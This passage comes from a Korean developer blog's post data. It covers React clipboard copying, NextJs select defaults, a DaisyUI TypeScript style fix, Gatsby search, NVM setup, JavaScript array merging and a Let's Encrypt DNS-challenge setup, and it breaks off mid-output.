된다\n\n![](/img01.png)\n\n그래서 1번 방법을 사용하는 것이 좋다.  \n나의 경우 UI에서 특정 버튼을 클릭하면 해당 텍스트를 클립보드로 변경시키는 것을 적용하였는데 코드는 아래와 같다.\n\n```tsx\n\n//특정 UI\n...\n<button\n  className=\"some class text\"\n  onClick={() => {\n    evnet4ClipCopy(\"복사할 테스트 값\")\n  }}\n>복사하기</button>\n...\n\n\n//위에서 호출하는 함수\nconst evnet4ClipCopy = (text: string) => {\n    ClipBoardCopy(text);\n};\n\n```\n\n아래는 저 **ClipBoardCopy** 컴포넌트이다.\n\n```tsx\nimport Swal from \"sweetalert2\"\n\nexport default function ClipBoardCopy(text: string) {\n  const showAlert = (title: string, isError?: boolean) => {\n    Swal.fire({\n      title: title,\n      icon: isError ? \"error\" : \"success\",\n      showConfirmButton: false,\n      timer: 1000,\n    })\n  }\n\n  // 흐음 1.\n  if (navigator.clipboard) {\n    // (IE는 사용 못하고, 크롬은 66버전 이상일때 사용 가능합니다.)\n    navigator.clipboard\n      .writeText(text)\n      .then(() => {\n        showAlert(\"클립보드에 복사되었습니다.\")\n      })\n      .catch(() => {\n        showAlert(\"복사를 다시 시도해주세요.\", true)\n      })\n  } else {\n    // 흐름 2.\n    if (!document.queryCommandSupported(\"copy\")) {\n      Swal.fire({\n        icon: \"error\",\n        title:\n          \"복사하기가 지원되지 않는 <br> 브라우저입니다. <br> 하단 내용을 참고하세요.\",\n        footer: text,\n      })\n      return\n    }\n\n    // 흐름 3.\n    const textarea = document.createElement(\"textarea\")\n    textarea.value = text\n    textarea.style.top = \"0\"\n    textarea.style.left = \"0\"\n    textarea.style.position = \"fixed\"\n\n    // 흐름 4.\n    document.body.appendChild(textarea)\n    // focus() -> 사파리 브라우저 서포팅\n    textarea.focus()\n    // select() -> 사용자가 입력한 내용을 영역을 설정할 때 필요\n    textarea.select()\n    // 흐름 5.\n    document.execCommand(\"copy\")\n    // 흐름 6.\n    document.body.removeChild(textarea)\n    showAlert(\"클립보드에 복사되었습니다.\")\n  }\n}\n```\n\n이렇게 구현을 하면 잘 동작한다.\n\n<br>\n\n### 참고\n\n위 코드는 아래 블로그를 보고 참고하였다.  \n좋은 글을 남겨주신 블로거님께 감사 드리며...\n\n[참고 블로그](https://kyounghwan01.github.io/blog/React/clipboard-copy/#예시-코드)\n\n```toc\n\n```\n"},{"excerpt":"NextJs에서 Select 태그를 쓸 때... 요새 MyMeLink 개발을 잠시 멈추고, 신규 서비스 개발을 진행하고 있다. 고도화 해야 하지만 이것 먼저 개발을 하는게 순서상 맞는 거 같아서, 잠시 홀드 했다. 역시 혼자서 다 하는건 빡세다... 본론으로 돌아와서... 신규 서비스를 Next.Js로 만들던 중 Select 태그를 써서 구현을 하다가 개…","fields":{"slug":"/next-js/221106_nextjs-use-select-error-default-value/"},"frontmatter":{"date":"November 06, 2022","title":"NextJs에서 Select 사용 시 에러 (Use the defaultValue ...)","description":null,"tags":["NextJs","Troubleshooting"],"series":"NextJs","previewImage":"nextjs_logo.webp","isPrivate":null},"rawMarkdownBody":"\n![thumbnail](../thumbnail_nextjs.png)\n\n# NextJs에서 Select 태그를 쓸 때...\n\n요새 **[MyMeLink](https//myme.link/mml)** 개발을 잠시 멈추고, 신규 서비스 개발을 진행하고 있다.  \n고도화 해야 하지만 이것 먼저 개발을 하는게 순서상 맞는 거 같아서, 잠시 홀드 했다.  \n역시 혼자서 다 하는건 빡세다...\n\n본론으로 돌아와서...  \n신규 서비스를 **Next.Js**로 만들던 중 **Select** 태그를 써서 구현을 하다가 개발자 콘솔에 이상하고 무시무시한게 떴다.\n\n그 전에...사용한 select 코드는 아래와 같다.\n\n```tsx\n<select className=\"select w-full max-w-xs\">\n  <option value={0} selected>\n    미포함\n  </option>\n  <option value={1}>1개</option>\n  <option value={2}>2개</option>\n  <option value={3}>3개</option>\n  <option value={4}>4개</option>\n</select>\n```\n\n<br>\n\n![](/img01.png)\n\n<br>\n\n난 저런 경고 에러만 봐도 해결을 해야 할거 같은 강박관념(?) 같은게 있어서 스스로 무덤을 판다;  \n먼저 원인은 저기 에러에서 나와있지만...\n\n> Next.JS에서 select 태그 사용 시 **option** 값에 **selected** 사용보다는 **defaultValue** 라는 것의 사용을 권장한다.\n\n그래서 코드를 다음과 같이 변경하면 경고가 더 이상 발생하지 않는다.\n\n```tsx\n<select className=\"select w-full max-w-xs\" defaultValue={0}>\n  <option value={0}>미포함</option>\n  <option value={1}>1개</option>\n  <option value={2}>2개</option>\n  <option value={3}>3개</option>\n  <option value={4}>4개</option>\n</select>\n```\n\n## 좀 더 찾아본 내용?\n\n이거를 살짝 시간내서 찾아본 결과 React에서는 **selected** 속성을 사용하는 대신 select 태그의 최상단 옵션을 사용한다.  \n즉 쉽게 정리하면...\n\n> select안의 맨 처음 option 값을 사용한다.\n\n그리고 이 디폴트 선택 값을 **defaultValue**를 통해서 바꿀 수 있다는 것이다.\n\n```toc\n\n```\n"},{"excerpt":"24.08.12 유감스럽게도 해당 프로젝트는 더 이상 운용되지 않고 있습니다... 마와셀과 흑우집합소도 이용해주시면 감사하겠습니다 ^^ 혼자서 만들어보다. 개발을 잠시 내려놓고 다른짓 하다가 문득 생각이 들었다. 한번 서비스를 직접 만들어서 운영해보면 어떻한가? 사실 전부터도 들었던 생각이긴 하지만 실천해보기로 했다. 그 전에 커뮤니티를 하나 만들었었는데…","fields":{"slug":"/my_project/221028_introduce-mml/"},"frontmatter":{"date":"October 28, 2022","title":"개인 토이 프로젝트 MyMeLink 서비스 오픈","description":null,"tags":["MyProject"],"series":"MHLab Project","previewImage":"strategy-pattern.png","isPrivate":null},"rawMarkdownBody":"\n# 24.08.12\n\n유감스럽게도 해당 프로젝트는 더 이상 운용되지 않고 있습니다...  \n마와셀과 흑우집합소도 이용해주시면 감사하겠습니다 ^^\n\n---\n\n# 혼자서 만들어보다.\n\n개발을 잠시 내려놓고 다른짓 하다가 문득 생각이 들었다.  \n**한번 서비스를 직접 만들어서 운영해보면 어떻한가?**\n\n사실 전부터도 들었던 생각이긴 하지만 실천해보기로 했다.  \n그 전에 커뮤니티를 하나 만들었었는데 반응형도 안되고 **jQuery**라는 고대 유물로 개발을 해서 그런지 엉망이었다.\n\n무튼 첫 커뮤니티는 Spring boot와 java8을 이용해 백엔드를 구현하고, 프론트? 라고 하기엔 유감스러울 정도인 화면단은 Thymeleaf로 만들었었다.\n\n그러다가 문뜩 **LinkTree**라는 서비스를 보고 생각이 들었다.  \n**이걸 내가 직접 구현해보면 어떨까?**\n\n만들고 싶었던 이유는?  \n그냥 나도 저런거 금방 만들 수 있을거 같은데?  \n라는 무모한 생각과 더불어 NextJs를 한번 공부해볼 요량을 만들게 되었다.\n\n그렇다...  \n뭐든지 쉽게 생각하면 안된다.\n\n마치 주식 시장에서 외국인 수급이 들어오면 이 주식이 드디어 가는구나...  \n미친 횡보를 마치고 드디어 움직이는구나...\n\n내가 공부해본 바에 의하면 이 택지 개발과 재개발로 인해 저평가구나!  \n옳거니! 가즈아!!!\n\n![](/img01.png)\n\n<br>\n\n<font color=\"red\"><b>이렇게 하면 망한다...</b></font>  \n**시장은 절대 만만하지 않다**  \n다들 남의 돈 어떻게 뺏을까 궁리하는 놈들 천지인데 ㅎㅎ\n\n물론 개발도 그렇다...  \n그렇다 나도 MyMeLink 서비스를 개발하면서 이거 쉽게 볼게 아니었구나 싶었다.\n\n역시 혼자서 기획하고, 디자인 짜고, 백엔드 개발하고, 프론트 와꾸 짜고 하는거...  \n이거 쉽게 보면 안되는거다...\n\n무튼 각설하고 서비스 링크는 아래와 같다.  \n[https://myme.link](https://myme.link)\n\n이름은 나야나 링크 이런 느낌이다.  \n사실 뭐로 할까 하다 생각이 안나서 즉흥적으로 지었다.\n\n![](/img02.png)\n\n<br>\n\n서비스 메인 화면이다.  \n로티파일인가로 일단 대강 장식해뒀고...\n\n<br>\n\n![](/img03.png)\n\n사용자 페이지를 꾸미는 부분이다.  \nUI가 좀 허접하다.  \n이 부분은 향후 개선을 많이 해봐야 할 부분이다.\n\n![](/img04.png)\n\n여기는 링크 추가하는 부분인데 아직 아이콘, 그리고 이미지 전용 버튼 QR 등등 기획한 기능 전부가 들어가지는 않았ㅇ다.  \n(혼자서 다 구현하는건 역시 고된 일이다...)\n\n<br>\n\n![](/img05.png)\n\n<br>\n\n여긴 사용자 페이지를 꾸미는 부분인데...  \n정말 UI 디자인을 배워서라도 다시 해보고 싶다.  \n내가 봐도 너무 투박한 티가 나서...  \n이 부분은 조만간 개선할 예정이다.\n\n|                 |                 |                 |\n| --------------- | --------------- | --------------- |\n| ![](/img06.png) | ![](/img07.png) | ![](/img08.png) |\n\n<br>\n\n아직은 투박하고 기능도 많이 부족하다.  \n뭐 0.9.5 버전이라 완성도는 많이 떨어진다.\n\n깃허브에 이슈등록된거만 엄청 많다. =.=;;  \n그런데 하나씩 하다보면 되겠지...\n\n이렇게 꾸미고 나서 사용자가 보는 페이지는 다음과 같다.\n\n![](/img09.PNG)\n\n<br>\n\n아래는 직접 볼 수 있는 링크다.\n\n[https://myme.link/elfinlas](https://myme.link/elfinlas)\n\n일단 어떻게 개발을 하고 어떤 이슈가 있었는지는 다시 포스팅을 정리하며 올릴 예정이다.  \n사실 지금은 이걸 유료화 해보고 싶어서 좀 기능을 이것저것 개발해서 사용자를 모아보고 싶다.\n\n**[MyMeLink](https://myme.link)**로 인해 내가 그린 첫 퍼즐(?)은 하나 완성되었다.  \n물론 아직 반쪽짜리긴 하지만...\n\n사실 어제부터 또 하나의 프로젝트를 시작했다.  \n전에 만들던 커뮤니티...\n\n이거는 이번 **[MyMeLink](https://myme.link)**를 만든 기술등을 녹여서 다시 제대로 만들어볼 예정이다.  \n혼자서 하기엔 힘들 수 있지만...  \n어쩌랴 ㅎㅎ  \n내 주변엔 이런거 할 사람도 없고 뜻 맞는 사람도 찾기 어렵다 ㅎㅎ\n\n주식시장이랑 부동산쪽에 하도 있었더니 주변에 개발자는 없어지고...  \n일단 정보방이랑 시장 돌면서 **인간에 대한 불신** 도 많이 생겼다.\n\n요새 다시 스타트업이나 회사로 들어가서 개발자로 일해보고 싶다는 생각도 문뜩 들었다.  \n뭐랄까...  \n그냥 떡볶이 팔던 놈은 떡볶이 팔아야지.  \n떡볶이 팔던 놈이 냉면 팔고, 돈까스 팔고 했더니 잡탕이 되어가는거 같다 ㅎㅎ\n\n뭐니해도 개발자는 적당한 스킬만 있으면 어디서 굻어죽지는 않으니까?\n\n무튼...  \n이 글을 보시는 분은 한번 서비스 가입해서 써봐주시고 피드백 주실게 있다면 반영해보겠다.\n\n다음 포스팅은 이거 개발하며 있었던 이슈 들을 하나씩 풀어보겠다.\n\n**[MyMeLink 홍보 페이지](https://myme.link/mml)**  \n많은 관심 부탁드립니다 ^^\n"},{"excerpt":"오늘도 평화로운 날이 있을 수 없는... 기존 프로젝트를 진행하면서 신규를 또 진행하는 어이없는 일정을 진행하며... 이번 문제는 DasiyUI에서 Countdown 컴포넌트를 적용하면서 발생한 문제로.. 바로 아래의 문제의 코드를 보자. 위 코드에서 span 태그 안에 style에 --value라는 css 키 요소가 문제였다. 에러는 다음과 같이 발생했…","fields":{"slug":"/next-js/221027_detailedhtmlprops-problem/"},"frontmatter":{"date":"October 27, 2022","title":"NextJs에서 DasiyUI 일부 컴포넌트 사용시 style 문제 (Typescript) (DetailedHTMLProps, Properties, HTMLAttributes)","description":null,"tags":["NextJs","DasiyUI"],"series":"NextJs","previewImage":"nextjs_logo.webp","isPrivate":null},"rawMarkdownBody":"\n![thumbnail](../thumbnail_nextjs.png)\n\n## 오늘도 평화로운 날이 있을 수 없는...\n\n기존 프로젝트를 진행하면서 신규를 또 진행하는 어이없는 일정을 진행하며...  \n이번 문제는 [DasiyUI](https://daisyui.com)에서 Countdown 컴포넌트를 적용하면서 발생한 문제로..\n\n바로 아래의 문제의 코드를 보자.\n\n```typescript\n<div className='flex flex-col'>\n  <span className='font-mono countdown text-3xl'>\n    <span style={{ '--value': seconds }}></span>\n  </span>\n  sec\n</div>\n```\n\n위 코드에서 span 태그 안에 style에 **--value**라는 css 키 요소가 문제였다.  \n에러는 다음과 같이 발생했다.\n\n```\n'{ \"--value\": number; }' 형식은 'Properties<string | number, string & {}>' 형식에 할당할 수 없습니다.\n  개체 리터럴은 알려진 속성만 지정할 수 있으며 'Properties<string | number, string & {}>' 형식에 '\"--value\"'이(가) 없습니다.ts(2322)\nindex.d.ts(1863, 9): 필요한 형식은 여기에서 'DetailedHTMLProps<HTMLAttributes<HTMLSpanElement>, HTMLSpanElement>' 형식에 선언된 'style' 속성에서 가져옵니다.\n```\n\n에디터 내에서는 에러가 발생하지만 개발용으로 구동 시 잘 돌아간다.  \n하지만 빌드를 하여 프로덕션으로 가면 이야기가 달라진다.  \n저 에러를 해결하지 않는 이상 빌드는 진행되지 않는다.\n\n## 그렇다면 어떻게 해결했는가?\n\n뭐 index.d.ts 라는 파일을 만들고 새로 declare? 재정의 해보고 정의 파일을 src 디렉토리 밖에 빼기도 하고 했지만 당연 안되었다. -\\_-;;  \n**문제는 어떤거 때문에 발생했다는 것을 알고 있고 이걸 어떻게 해결해야 하는지도** 알고 있지만 그 해결 방법을 구현하는 방법을 몰랐다.\n\n마치 해외 여행 나가서 밥 주세요를 그 국가 언어로 못하는 느낌이랄까...  \n다시 정리하면 새로 재정의하는 것이 아닌 **해당 css 키가 CSS 속성이라는 것** 만 알려주면 되는 문제였다.\n\n> as React.CSSProperties\n\n그래서 아래의 코드로 간단하게 해결할 수 있었다.\n\n```tsx\n<div className='flex flex-col'>\n  <span className='font-mono countdown text-3xl'>\n    <span style={{ '--value': seconds } as React.CSSProperties}></span>\n  </span>\n  sec\n</div>\n```\n\n이 간단한 문제로 고통을 받았더니 맨탈이 흔들렸다.  \n주식시장에서 손절칠 때랑 비슷한 유형이지만 맛은 다른 고통...  \n이제는 그만 맛보고 싶다 ㅎㅎ\n\n<br>\n\n[참고한 stackoverflow](https://stackoverflow.com/questions/52005083/how-to-define-css-variables-in-style-attribute-in-react-and-typescript)\n\n```toc\n\n```\n"},{"excerpt":"블로그를 갈아타면서... 기존에 쓰던 Hexo 를 버리고 새롭게 이전을 했다. 개인적으로 만들던 플젝에 집중하느라 블로그 이전이 좀 늦었었다. 자잘한 이야기는 뒤로 하고... Gatsby로 갈아타면서 직접 블로그를 만들까 했는데 할일이 너무 많아서 포기했다. 사실 직장 안다니면 한가할 줄 알았는데 전혀... 할일이 더 많아진거 같다. =.= 그래서 직접 …","fields":{"slug":"/gatsby/221027_starter-search-add/"},"frontmatter":{"date":"October 27, 2022","title":"Gatsby 블로그에 검색 기능을 추가하기 (with Gatsby-starter-bee )","description":null,"tags":["Gatsby"],"series":"Gatsby","previewImage":"gatsby_logo.png","isPrivate":null},"rawMarkdownBody":"\n![](../thumbnail.png)\n\n## 블로그를 갈아타면서...\n\n기존에 쓰던 **Hexo** 를 버리고 새롭게 이전을 했다.  \n개인적으로 만들던 플젝에 집중하느라 블로그 이전이 좀 늦었었다.\n\n자잘한 이야기는 뒤로 하고...  \n**Gatsby**로 갈아타면서 직접 블로그를 만들까 했는데 할일이 너무 많아서 포기했다.  \n사실 직장 안다니면 한가할 줄 알았는데 전혀...  \n할일이 더 많아진거 같다. =.=\n\n그래서 직접 개발은 포기하고 다른거 주워서 쓰려고 찾아보니...  \n이 블로그 테마가 가장 많이 사용되는거 같았다.\n[Gatsby-starter-bee](https://github.com/JaeYeopHan/gatsby-starter-bee)\n\n근데 이 테마의 단점(?)은 검색 기능이 없다는 것이다.  \n그래서 [깃허브 이슈](https://github.com/JaeYeopHan/gatsby-starter-bee/issues/179)에도 등록이 되어는 있지만,  \n진척은 없었다.\n\n그래도 마지막에 **kostyrko**라는 외국 성님이 뭔가 힌트를 줘서 나도 그거에 맞춰 적용을 해봤다.\n\n**이 내용은 내 블로그에 검색 기능을 추가하는 것**을 남길 목적으로 포스팅한다.\n\n다른 테마 버그나 기타 문의는 [깃허브 이슈](https://github.com/JaeYeopHan/gatsby-starter-bee) 등록을 하고 물어보길 바란다.  \n(여담인데 요새는 업데이트가 안되고 버려진거 같다.)\n\n진행에 앞서...  \n내가 사용하는 Node 버전은 **14.15.0** 버전이다.  \n아마 이 테마를 받아서 그대로 사용하는 사람은 저 버전이거나 근처일거라 생각한다.\n\n<br>\n\n### 1. npm 패키지 추가\n\n**package.json** 파일에 아래의 dependencies 들을 추가하고 설치한다.\n\n```json\n{\n    ...\n    \"flexsearch\": \"^0.7.21\",\n    \"gatsby-plugin-local-search\": \"^2.0.1\",\n    \"react-use-flexsearch\": \"^0.1.1\"\n    ...\n}\n```\n\n> $ npm install\n\n<br>\n\n### 2. 파일 수정\n\n크게 커스텀을 안했다는 가정하에 작성한다.  \n아래 코드를 복붙 하지 말고 주석을 참고해서 배치하자.\n\n```javascript\n//pages/index.js 파일 수정\n\n//import 추가\nimport { Search } from \"../components/search\"\nimport { useFlexSearch } from \"react-use-flexsearch\"\n\n//상단 getDistance 함수 근처 (또는 원하는 곳에...)\nfunction unFlattenResults(results) {\n  return results.map(post => {\n    const { slug, excerpt, title, category, date, draft } = post\n    return {\n      node: {\n        excerpt: excerpt,\n        frontmatter: { title, category, date, draft },\n        fields: { slug },\n      },\n    }\n  })\n}\n\n//아래 상수 있는 부근에.. (이것도 원하는 곳에...)\n//const { countOfInitialPost } = siteMetadata.configs\n\nconst isBrowser = () => typeof window !== \"undefined\"\nconst { search } = isBrowser() && window.location\n\nconst query = new URLSearchParams(search).get(\"s\")\nconst [searchQuery, setSearchQuery] = useState(query || \"\")\nconst results = useFlexSearch(\n  searchQuery,\n  data.localSearchPages.index,\n  data.localSearchPages.store\n)\n\nconst posts = searchQuery\n  ? unFlattenResults(results)\n  : data.allMarkdownRemark.edges\n\n//기존에 사용하던 posts 상수는 주석 처리 해준다.\n// const posts = data.allMarkdownRemark.edges\n\n//하단에 graphql 부분에 다음과 같이 추가한다.\n//localSearchPages 항목을 배치해준다.\n\nexport const pageQuery = graphql`\n  query {\n    localSearchPages {\n      index\n      store\n    }\n    site {}\n    }`\n```\n\n<br>\n\n### 3. 컴포넌트 추가\n\nsrc 밑에 component 디렉토리에 **search** 디렉토리를 새로 만들고,  \n**index.jsx** **index.scss** 두 파일을 만들어준다.\n\n그리고 아래와 같이 추가한다.\n\n```javascript\n//src/component/search/index.jsx\n\nimport React from \"react\"\nimport \"./index.scss\"\n\nexport const Search = ({ searchQuery, setSearchQuery }) => {\n  return (\n    <form action=\"/\" method=\"get\" autoComplete=\"off\" className=\"search-form\">\n      <label htmlFor=\"header-search\">\n        <span className=\"visually-hidden\">Search blog posts</span>\n      </label>\n      <input\n        value={searchQuery}\n        onChange={e => setSearchQuery(e.target.value)}\n        type=\"text\"\n        id=\"header-search\"\n        className=\"search-form__input\"\n        placeholder=\"Serch keyword\"\n        name=\"s\"\n      />\n    </form>\n  )\n}\n```\n\n```scss\n//src/component/search/index.scss\n\n.search-form {\n  width: 100%;\n  display: flex;\n  justify-content: center;\n  .visually-hidden {\n    clip: rect(0 0 0 0);\n    clip-path: inset(50%);\n    height: 1px;\n    overflow: hidden;\n    position: absolute;\n    white-space: nowrap;\n    width: 1px;\n  }\n  .search-form__input {\n    font-family: Source Sans Pro, Roboto, Open Sans, Liberation Sans, DejaVu\n        Sans, Verdana, Helvetica, Arial, sans-serif;\n    outline: 0;\n    margin: 0;\n    border: 1px solid #d9d9d9;\n    box-sizing: border-box;\n    color: #333;\n    display: block;\n    font-size: 14px;\n    height: 40px;\n    line-height: 40px;\n    padding: 0 15px;\n    max-width: 350px;\n    width: 90%;\n    border-radius: 25px;\n    background: #f5f5f5;\n    box-shadow: inset 4px 4px 4px #d0d0d0;\n  }\n}\n```\n\n<br>\n\n### 4. gatsby-config.js 파일 수정\n\n**gatsby-config.js** 파일의 일부 수정하면 끝이다.\n\n```json\n{\n    ...\n    {\n      resolve: 'gatsby-plugin-local-search',\n      options: {\n        name: 'pages',\n        engine: 'flexsearch',\n        query: `\n              query {\n                allMarkdownRemark(sort: { fields: [frontmatter___date], order: DESC }) {\n                  nodes {\n                    excerpt\n                    fields {\n                      slug\n                    }\n                    frontmatter {\n                      date(formatString: \"MMMM DD, YYYY\")\n                      title,\n                      category\n                    }\n                  }\n                }\n              }\n            `,\n        ref: 'slug',\n        index: ['title', 'excerpt', 'category'],\n        store: ['title', 'excerpt', 'slug', 'date', 'category'],\n        normalizer: ({ data }) =>\n          data.allMarkdownRemark.nodes.map(node => ({\n            title: node.frontmatter.title,\n            excerpt: node.excerpt,\n            slug: node.fields.slug,\n            date: node.frontmatter.date,\n            category: node.frontmatter.category,\n          })),\n      },\n    },\n    `gatsby-transformer-sharp`,\n    ...\n}\n```\n\n<br>\n\n이렇게 하고 구동하면 내 블로그 처럼 검색 기능이 달릴거다.  \n나처럼 바쁜데 컨텐츠는 올려야 하고, 직접 구현은 시간이 없어서 대충 쓰고 싶은 사람들에겐 최고의 결과물 조합이 아닐까 싶다.\n\n이렇게 했는데도 잘 모르겠고, 답답한 분들은 댓글 또는 이 [깃허브(kostyrko)](https://github.com/kostyrko/kontrolqa) 를 참고하자.  \n이 형님이 아까 이슈에서 참고했던 깃허브이다.  \n이거 보고도 적용이 안된다면...=.=;;;\n\n그냥 다른 블로그 테마를 찾아보는 것이 정신적으로 편안할 듯 싶다.\n\n<br>\n\nPS : 시간이 부족하다....\n\n```toc\n\n```\n"},{"excerpt":"NVM (Node Version Manager) 이번에 Hexo 에서 Gatsby 블로그로 옮겨오면서 이것저것 셋팅하느라 바빴다. 그 중 이 블로그는 Gatsby-Starter-bee 라는 테마로 구성되어 있다. 근데 이 블로그 탬플릿은 노드 상위 버전을 지원하지 않는다. 허나... 지금 하는 프로젝트는 18버전대 이상을 사용한다.\n그래서 Node 버전을…","fields":{"slug":"/node-js/221027_install-nvm/"},"frontmatter":{"date":"October 27, 2022","title":"NVM으로 NodeJs 버전 변경 관리하기","description":null,"tags":["NodeJS","NVM"],"series":"NodeJS","previewImage":"nodejs_logo.png","isPrivate":null},"rawMarkdownBody":"\n# NVM (Node Version Manager)\n\n이번에 **Hexo** 에서 **Gatsby** 블로그로 옮겨오면서 이것저것 셋팅하느라 바빴다.  \n그 중 이 블로그는 [Gatsby-Starter-bee](https://github.com/JaeYeopHan/gatsby-starter-bee) 라는 테마로 구성되어 있다.\n\n근데 이 블로그 탬플릿은 노드 상위 버전을 지원하지 않는다.  \n허나... 지금 하는 프로젝트는 18버전대 이상을 사용한다.\n그래서 Node 버전을 관리하며 사용해야 했다.\n\n파이썬에는 **PyEnv**인가 하는 것이 있는데 역시 노드 진영에도 비슷한 것을 하는게 있었다.  \n오늘 포스팅할 **NVM**이라는 것인데 대충 설명하면...\n\n> 프로젝트마다 버전 관리하기.\n\n라고 할 수 있다.\n\n<br>\n\n먼저 nvm을 설치한다.  \n윈도우나 기타 리눅스는 다른 블로그를 참고해주시고...  \n이곳에서는 **MacOS** 기준으로 설명한다.\n\n뭐 설명이고 자시고 할 것 없이 **brew** 하나 있으면 끝이다.\n\n```\nbrew install nvm\n```\n\n설치 후 NVM 설정을 해줘야 하는데 터미널 쉘을 수정해야 한다.  \n나의 경우 zsh를 사용하는데 home 디렉토리의 **.zshrc**라는 파일을 열어서 수정한다.  \nVSCode로 수정해도 되고 vim으로 수정해도 되고 편한 방법으로...\n\n```\n#파일 맨 마지막에 추가해준다.\nexport NVM_DIR=~/.nvm\nsource $(brew --prefix nvm)/nvm.sh\n```\n\n위와 같이 처리했다면 터미널을 종료 후 재시작 하고 잘 되었는지 아래 명령어를 통해 확인한다.\n\n![](/img01.png)\n\n<br>\n\n위와 같이 뜨면 잘 설치된 것이다.\n\n## 유용한 명령어들\n\n### 최신 버전의 node 설치\n\n> nvm install node\n\n### 최신 버전의 LTS 설치\n\n> nvm install --lts\n\n### 특정 버전 설치\n\n> nvm install 14.15.0\n\n### 설치된 버전 확인하기\n\n> nvm ls\n\n### 설치된 특정 버전 사용하기\n\n> nvm use 14.15.0\n\n```toc\n\n```\n"},{"excerpt":"배열 합치기(?) 프로젝트를 진행하다가 배열을 좀 다룰 일이 있어서 찾아봤다. 그냥 안써두면 까먹을거 같아서 기록해둔다.\n방법은 여러가지가 있는데 하나씩 적어둔다 1. concat 함수 이용 ...연산자 (Spread Operator)를 활용 Push 함수 활용 (with ...연산자) 단 여기서 ...연산자를 뺄 경우 배열 자체가 추가가 된다. 즉 결과…","fields":{"slug":"/js_ts/221027_array_combine/"},"frontmatter":{"date":"October 27, 2022","title":"(Javascript) 배열 합치기","description":null,"tags":["Javascript"],"series":"JS_TS","previewImage":"javascript_logo.png","isPrivate":null},"rawMarkdownBody":"\n\n# 배열 합치기(?)\n\n프로젝트를 진행하다가 배열을 좀 다룰 일이 있어서 찾아봤다.  \n그냥 안써두면 까먹을거 같아서 기록해둔다.\n방법은 여러가지가 있는데 하나씩 적어둔다\n\n## 1. concat 함수 이용\n\n```javascript\nconst tmpArr1 = ['value1', 'value2', 'value3'];\nconst tmpArr2 = ['1', '22', '333'];\n\nconst result = tmpArr1.concat(tmpArr2);\n\n//두 개 이상을 전달할 수 있다\n//const result = tmpArr1.concat(tmpArr2, [\"tmp1\",\"tmp2\"]);\n\n//이 방법도 가능하다\n//const result = [].concat(tmpArr1, tmpArr2);\n\nconsole.log(result);\n```\n\n## ...연산자 (Spread Operator)를 활용\n\n```javascript\nconst tmpArr1 = ['value1', 'value2', 'value3'];\nconst tmpArr2 = ['1', '22', '333'];\n\nconst result = [...tmpArr1, ...tmpArr2];\n\nconsole.log(result);\n```\n\n## Push 함수 활용 (with ...연산자)\n\n```javascript\nconst tmpArr1 = ['value1', 'value2', 'value3'];\nconst tmpArr2 = ['1', '22', '333'];\n\n//빈 배열 선언\nconst result = [];\n\nresult.push(...tmpArr1);\nresult.push(...tmpArr2);\n\nconsole.log(result);\n```\n\n단 여기서 ...연산자를 뺄 경우 배열 자체가 추가가 된다.  \n즉 결과물이 아래와 같이 나오게 된다.\n\n```\n//with ...oper\n['value1', 'value2', 'value3','1', '22', '333']\n\n//without ...oper\n[['value1', 'value2', 'value3'], ['1', '22', '333']]\n\n```\n\n```toc\n\n```\n"},{"excerpt":"23.01.18 아마존에서 작업이 미흡해서 일부 내용을 추가합니다.  이번에 서비스를 개발하고 오픈하면서... 예전에 LetsEncrypt를 적용해봤던 적은 있었다. 하지만 방법이 너무 오래되었고, 와일드카드 방식으로 도메인을 사용해서 인증 방법을 다시 찾아보았다. 그 전에 앞서 먼저 내가 사용했었던 두 가지 방식을 간단하게 정리하고 넘어가겠다. Stan…","fields":{"slug":"/letsencrypt/220923_use-letsencrypt/"},"frontmatter":{"date":"September 23, 2022","title":"Lets Encrypt 적용하기 (AWS EC2 기준)","description":null,"tags":["LetsEncrypt","Aws","Infra"],"series":"LetsEncrypt","previewImage":"letsencrypt_logo.webp","isPrivate":null},"rawMarkdownBody":"\n# 23.01.18\n\n### 아마존에서 작업이 미흡해서 일부 내용을 추가합니다.\n\n---\n\n![](../thumbnail.jpg)\n\n# 이번에 서비스를 개발하고 오픈하면서...\n\n예전에 LetsEncrypt를 적용해봤던 적은 있었다.  \n하지만 방법이 너무 오래되었고, 와일드카드 방식으로 도메인을 사용해서 인증 방법을 다시 찾아보았다.\n\n그 전에 앞서 먼저 내가 사용했었던 두 가지 방식을 간단하게 정리하고 넘어가겠다.\n\n<br>\n\n## Standalone 과 Webroot 방식\n\n먼저 **Standalone** 방식의 경우 비 효율적인 방식이다.\n\n적용 대상의 80포트에 서버를 띄워서 인증하고 인증서를 발급받는 방식인데,  \n실제 서비스 시 인증을 하게 될 경우 매우 곤란한 상황이 연출될 것이다.  \n그리고 와일드카드 서브 도메인의 인증이 불가능하다.\n\n**Webroot** 방식의 경우 위 방법보다는 덜 무식하다.\n\n서버의 특정 디렉토리에 접근 가능 여부를 테스트 해서 인증서를 발급해주는 방식이다.  \n하지만 서브도메인이 존재하는 경우 각각 인증서를 발급받아야 한다.\n\n예를 들어서 설명하면 www.test.com 과 test.com 이렇게 두 가지 적용을 하려면 둘 다 인증서를 받아야 한다.  \n또한 api.test.com apis.test.com 등과 같이 와일드카드 서브 도메인들도 일일히 적용을 해야 하는 단점이 있다.\n\n<br>\n\n## DNS 인증 방법\n\n오늘 소개할 방법이다.\n\nLetsEncrypt에서 요구하는 특정 값을 DNS의 TXT 레코드에 입력해서 인증을 하는 방식이다.  \n복잡할거 같은데 그냥 몇개 입력만 하면 끝난다.\n\n그리고 이 방법은 와일드카드 서브 도메인 인증을 지원하기에 확장성은 좋은 인증 방법이다.\n\n> 이번 적용 환경은 다음과 같다.  \n> OS : Ubuntu 20.04  \n> AWS EC2 환경 & Route53 기준 설명 (기타 DNS 서비스에서 유사 진행 가능)\n\n먼저 설치를 진행해야 한다.  \n**Ubuntu** 진행 기준이다.\n\n```\napt install letsencrypt\napt install certbot\n```\n\n설치 후 아래의 명령어를 통해 인증 절차를 진행한다.\n\n```\ncertbot certonly --manual -d *.test.com -d test.com --preferred-challenges dns\n```\n\n아래는 실행 결과이다.  \n민감한 정보는 일부 가렸다.\n\n```\nubuntu$ sudo certbot certonly --manual -d *.test.com -d test.com --preferred-challenges dns\nSaving debug log to /var/log/letsencrypt/letsencrypt.log\n\n- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\nYou have an existing certificate that contains a portion of the domains you\nrequested (ref: /etc/letsencrypt/renewal/test.com.conf)\n\nIt contains these names: test.com\n\nYou requested these names for the new certificate: *.test.com, test.com.\n\nDo you want to expand and replace this existing certificate with the new\ncertificate?\n- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 